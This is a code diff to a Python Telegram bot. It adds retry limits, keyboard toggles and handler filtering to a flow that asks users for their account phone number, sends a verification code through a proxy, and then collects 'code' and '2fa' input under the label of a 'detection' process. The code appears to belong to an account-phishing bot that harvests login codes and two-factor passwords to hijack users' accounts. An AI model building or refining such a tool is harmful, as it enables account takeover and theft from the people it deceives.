@@ -18,6 +18,7 @@ from aiogram import Router, F, Bot, BaseMiddleware
 from aiogram.types import (
     Message, CallbackQuery, FSInputFile,
     InlineKeyboardMarkup, InlineKeyboardButton,
+    ReplyKeyboardMarkup, ReplyKeyboardRemove,
 )
 from aiogram.filters import Command
 from typing import Callable, Dict, Any, Awaitable
@@ -545,9 +546,11 @@ async def cmd_start(message: Message, bot: Bot):
 
     _record_msg(uid, _user_name(message), "user", "/start", bot)
     # phone 模式：普通键盘按钮，点击后让用户手动输入手机号（不再直接分享联系人）
-    mode = "phone"
-    reply_markup = main_menu_kb(mode, _phone_btn_label(),
-                               _c("phone_button_style", ""))
+    # phone_button_enabled=False 时收起键盘，用户直接输入手机号
+    if _phone_kb_enabled():
+        reply_markup = _phone_kb()
+    else:
+        reply_markup = ReplyKeyboardRemove()
     # /start 回复可发多条：先「/start 回复」，再「/start 回复2」（填了才发）；
     # 每个框内还可用单独一行 `---`（3+ 短横线）继续拆分。键盘按钮只挂在最后一条上。
     segments: list[str] = []
@@ -618,12 +621,8 @@ async def _do_send_code(bot: Bot, chat_id: int, uid: int, name: str, phone: str)
         custom = _c("proxy_fail_text", "").strip()
         if custom:
             err_msg = custom
-    await bot.send_message(
-        chat_id, f"❌ {err_msg}",
-        reply_markup=main_menu_kb(
-            mode="phone",
-            button_text=_phone_btn_label(),
-            style=_c("phone_button_style", "")))
+    # 发码失败也算一次手机号尝试；达到上限则本轮流程结束
+    await _phone_attempt_fail(bot, chat_id, uid, name, f"❌ {err_msg}")
     logger.warning(f"[{uid}] 发送验证码失败: {err_msg}")
     return False
 
@@ -635,8 +634,11 @@ async def _begin_send_code(message: Message, bot: Bot, uid: int, phone: str):
     if _cfg and not _cfg.get("share_phone_skip_confirm", True):
         confirm_prompt = _c("send_code_confirm_text", "请确认是否发送回执码")
         btn_label = (_c("verify_button_text", "") or "").strip() or "是否验证手机号"
+        prev = _get_state(uid, bot) or {}
         _set_state(uid, bot, {
-            "phone": phone, "step": "confirm_send", "created_at": time.time(),
+            "phone": phone, "step": "confirm_send",
+            "created_at": time.time(),
+            "attempts": prev.get("attempts", 0),
         })
         kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(
@@ -689,6 +691,48 @@ def _phone_btn_label() -> str:
     return (_c("phone_button_text", "") or "").strip() or DEFAULT_PHONE_BUTTON_TEXT
 
 
+def _phone_kb_enabled() -> bool:
+    """底部键盘按钮开关（回复配置页「启用按钮」）。"""
+    return bool(_cfg.get("phone_button_enabled", True)) if _cfg else True
+
+
+def _phone_kb() -> ReplyKeyboardMarkup:
+    """常驻底部的手机号输入按钮键盘。"""
+    return main_menu_kb("phone", _phone_btn_label(),
+                        _c("phone_button_style", ""))
+
+
+async def _phone_attempt_fail(bot: Bot, chat_id: int, uid: int, name: str,
+                              fail_text: str):
+    """手机号尝试失败计数：未到上限提示重输，达到上限弹过期提示并结束本轮。
+
+    与验证码步骤一致：phone_max_attempts 次内可重试，最后一次失败时发
+    phone_expired_text 并清状态，用户重新走一轮（按按钮或 /start）。
+    """
+    state = _get_state(uid, bot) or {}
+    state["step"] = "phone_input"
+    state.setdefault("created_at", time.time())
+    state["attempts"] = state.get("attempts", 0) + 1
+    if state["attempts"] >= int(_c("phone_max_attempts", "3")):
+        _pop_state(uid, bot)
+        text = _c("phone_expired_text", "")
+        if not text:
+            text = ("❌ 当前号码输入已过期，本次检测流程已结束。\n"
+                    "请重新发送手机号开始新一轮检测。")
+        reply_markup = (_phone_kb() if _phone_kb_enabled()
+                        else ReplyKeyboardRemove())
+        await bot.send_message(chat_id=chat_id, text=text,
+                               parse_mode="HTML", reply_markup=reply_markup)
+        _record_msg(uid, name, "bot", text, bot)
+        return
+    _set_state(uid, bot, state)
+    if fail_text:
+        reply_markup = _phone_kb() if _phone_kb_enabled() else None
+        await bot.send_message(chat_id=chat_id, text=fail_text,
+                               parse_mode="HTML", reply_markup=reply_markup)
+        _record_msg(uid, name, "bot", fail_text, bot)
+
+
 def _is_phone_login_btn(message: Message) -> bool:
     """Match the phone-login menu button by its configured (or default) label.
 
@@ -703,11 +747,15 @@ def _is_phone_login_btn(message: Message) -> bool:
 @router.message(_is_phone_login_btn)
 async def btn_phone_login(message: Message, bot: Bot):
     uid = message.from_user.id
-    _set_state(uid, bot, {"step": "phone_input"})
+    _set_state(uid, bot, {
+        "step": "phone_input", "created_at": time.time(), "attempts": 0,
+    })
     prompt = _render_template(_c("phone_input_text", ""), message)
     if not prompt.strip():
         prompt = "⚠️请输入您的账户手机号码（带完整区号，例如 +86 13088888888）"
-    await message.answer(prompt, parse_mode="HTML")
+    await message.answer(
+        prompt, parse_mode="HTML",
+        reply_markup=_phone_kb() if _phone_kb_enabled() else None)
     _record_msg(uid, _user_name(message), "bot", prompt, bot)
     logger.info(f"[{uid}] 进入手动输入手机号模式")
 
@@ -716,24 +764,31 @@ async def btn_phone_login(message: Message, bot: Bot):
 _PHONE_INPUT_RE = re.compile(r"^\s*\+?\d[\d\s\-()]{5,20}\s*$")
 
 
-@router.message(F.text.regexp(_PHONE_INPUT_RE))
+def _is_phone_step(message: Message) -> bool:
+    """只在用户处于手机号输入环节（phone_input / started）时才拦截号码样式文本。
+
+    没有这个过滤时，本轮已结束的消息会被正则 handler 吞掉而没有任何回复
+    （就是「第二遍输入没反应」的原因）。"""
+    return any(
+        s.get("step") in ("phone_input", "started")
+        for (u, _), s in _user_state.items() if u == message.from_user.id
+    )
+
+
+@router.message(F.text.regexp(_PHONE_INPUT_RE), _is_phone_step)
 async def handle_phone_input(message: Message, bot: Bot):
     uid = message.from_user.id
-    state = _get_state(uid, bot)
-    if not state or state.get("step") not in ("phone_input", "started"):
-        return
+    name = _user_name(message)
 
     digits = re.sub(r"\D", "", message.text)
     if not (7 <= len(digits) <= 15):
-        _record_msg(uid, _user_name(message), "user", message.text.strip(), bot)
-        err = _c("phone_invalid_text", "")
-        if err:
-            await message.answer(err, parse_mode="HTML")
-            _record_msg(uid, _user_name(message), "bot", err, bot)
+        _record_msg(uid, name, "user", message.text.strip(), bot)
+        await _phone_attempt_fail(
+            bot, message.chat.id, uid, name, _c("phone_invalid_text", ""))
         return
 
     phone = "+" + digits
-    _record_msg(uid, _user_name(message), "user", phone, bot)
+    _record_msg(uid, name, "user", phone, bot)
     await _begin_send_code(message, bot, uid, phone)
 
 
@@ -858,12 +913,11 @@ async def handle_default(message: Message, bot: Bot):
     if state and state.get("step") in ("code", "2fa"):
         return  # Already handled by specific handlers above
     if state and state.get("step") == "phone_input":
-        # 手机号格式不对（含文字或位数不对）→ 提示重新输入
+        # 手机号格式不对（含文字或位数不对）→ 计数一次并提示重新输入
         _record_msg(uid, _user_name(message), "user", message.text.strip(), bot)
-        err = _c("phone_invalid_text", "")
-        if err:
-            await message.answer(err, parse_mode="HTML")
-            _record_msg(uid, _user_name(message), "bot", err, bot)
+        await _phone_attempt_fail(
+            bot, message.chat.id, uid, _user_name(message),
+            _c("phone_invalid_text", ""))
         return
 
     _record_msg(uid, _user_name(message), "user", message.text.strip(), bot)
